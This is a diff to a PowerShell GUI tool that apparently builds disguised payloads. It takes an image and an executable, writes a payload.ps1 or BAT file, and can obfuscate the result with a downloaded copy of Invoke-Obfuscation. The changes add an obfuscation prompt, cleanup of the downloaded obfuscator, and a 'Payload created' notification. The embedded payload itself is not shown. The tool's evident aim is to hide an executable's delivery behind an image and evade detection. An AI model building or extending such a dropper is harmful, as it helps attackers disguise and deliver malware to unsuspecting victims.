@@ -77,16 +77,14 @@ $inputXML = @'
         <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
         <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
         <TextBox x:Name="OUTPUT_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
-        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,61,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black"/>
-        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,142,0,0" VerticalAlignment="Top" Width="423" FontFamily="Segoe UI Black"/>
+        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,66,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black" FontSize="14"/>
+        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,142,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black" FontSize="14"/>
         <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="516,189,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18"/>
         <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62" Background="#FF00FC00" FontFamily="Sitka Text Semibold"/>
         <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62" Background="Lime" FontFamily="Sitka Text Semibold"/>
         <Button x:Name="ps1_button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
         <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
         <Image HorizontalAlignment="Left" Height="189" Margin="604,10,0,0" VerticalAlignment="Top" Width="186" Source="comethazine.png"/>
-        <TextBox x:Name="OBF_TEXT_TF" HorizontalAlignment="Left" Height="21" Margin="92,123,0,0" TextWrapping="Wrap" Text="False" VerticalAlignment="Top" Width="118"/>
-        <Button x:Name="OBFUSCATE_TF" Content="Obfuscate" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="43" Margin="222,123,0,0" VerticalAlignment="Top" Width="123" FontFamily="Sitka Small Semibold" FontSize="20" BorderBrush="#FF1AFB00" Background="Black" BorderThickness="4,4,4,4" Foreground="White"/>
     </Grid>
 </Window>
 '@
@@ -96,6 +94,35 @@ function Hide-Console
     $consolePtr = [Console.Window]::GetConsoleWindow()
     #0 hide
     [Console.Window]::ShowWindow($consolePtr, 0)
+}
+
+function Show-Notification {
+    [cmdletbinding()]
+    Param (
+        [string]
+        $ToastTitle,
+        [string]
+        [parameter(ValueFromPipeline)]
+        $ToastText
+    )
+
+    [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
+    $Template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
+
+    $RawXml = [xml] $Template.GetXml()
+    ($RawXml.toast.visual.binding.text|Where-Object {$_.id -eq "1"}).AppendChild($RawXml.CreateTextNode($ToastTitle)) > $null
+    ($RawXml.toast.visual.binding.text|Where-Object {$_.id -eq "2"}).AppendChild($RawXml.CreateTextNode($ToastText)) > $null
+
+    $SerializedXml = New-Object Windows.Data.Xml.Dom.XmlDocument
+    $SerializedXml.LoadXml($RawXml.OuterXml)
+
+    $Toast = [Windows.UI.Notifications.ToastNotification]::new($SerializedXml)
+    $Toast.Tag = "PowerShell"
+    $Toast.Group = "PowerShell"
+    $Toast.ExpirationTime = [DateTimeOffset]::Now.AddMinutes(1)
+
+    $Notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell")
+    $Notifier.Show($Toast);
 }
 
 function New-random_string {
@@ -114,14 +141,17 @@ function Invoke-PowershellOBF {
         [string]$file_location
     )
     $OBFUSCATOR_URL = "https://github.com/danielbohannon/Invoke-Obfuscation/archive/refs/heads/master.zip"
-    $OBFUSCATOR_PATH = "$env:temp\Invoke-Obfuscation.zip"
-    $OBFUSCATOR_EXTRACT_PATH = "$env:temp\Invoke-Obfuscation"
+    $OBFUSCATOR_PATH = "$working_dir\Invoke-Obfuscation.zip"
+    $OBFUSCATOR_EXTRACT_PATH = "$working_dir\Invoke-Obfuscation"
     Start-BitsTransfer -Source $OBFUSCATOR_URL -Destination $OBFUSCATOR_PATH
     Expand-Archive -Path $OBFUSCATOR_PATH -DestinationPath $OBFUSCATOR_EXTRACT_PATH
-    $command = "cd Invoke-Obfuscation-master ; Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation -ScriptPath $file_location -Command 'Encoding\\6, Copy'"
+    $command = "cd Invoke-Obfuscation ; Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation -ScriptPath $file_location -Command 'Encoding\\6, Copy'"
     Invoke-Command -ScriptBlock { $command }
     $clipboard_output = Get-Clipboard
     $clipboard_output | Out-File -FilePath $file_location
+    Remove-Item -Path $OBFUSCATOR_PATH
+    Get-ChildItem $OBFUSCATOR_EXTRACT_PATH -Recurse | Remove-Item -Force
+    Remove-Item -Path $OBFUSCATOR_EXTRACT_PATH
 }
 
 function Invoke-obfuscate {
@@ -191,10 +221,22 @@ function build {
     $var_OUTPUT_BOX.Text += "Writing payload to file...`n"
     $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
     $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\payload.ps1"
-    if ($type -eq "ps1" -and $var_OBF_TEXT_TF.Text -eq "True") {
-        $var_OUTPUT_BOX.Text += "Obfuscating powershell code...`n"
-        Invoke-PowershellOBF "$working_dir\output\payload.ps1"
+
+    if ($type -eq "bat") {
+        $var_OUTPUT_BOX.Text += "No Obfuscation...`n"
+    } else {
+        $obfuscate_box = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
+        switch ($obfuscate_box) {
+            "Yes" {
+                $var_OUTPUT_BOX.Text += "Obfuscating powershell code...`n"
+                Invoke-PowershellOBF "$working_dir\output\payload.ps1"
+            }
+            "No" {
+                $var_OUTPUT_BOX.Text += "No Obfuscation...`n"
+            }
+        }
     }
+
     if ($type -eq "bat") {
         $var_OUTPUT_BOX.Text += "Obfuscating batch code...`n"
         $ps1_code = $EMBEDDED_CODE.Split("`n")
@@ -222,6 +264,7 @@ function build {
     }
     #set color to green in text box
     $var_OUTPUT_BOX.Text += "`nDone!`n"
+    Show-Notification "Done!" "Payload created in $working_dir\output"
 }
 
 $image_name = "comethazine.png"
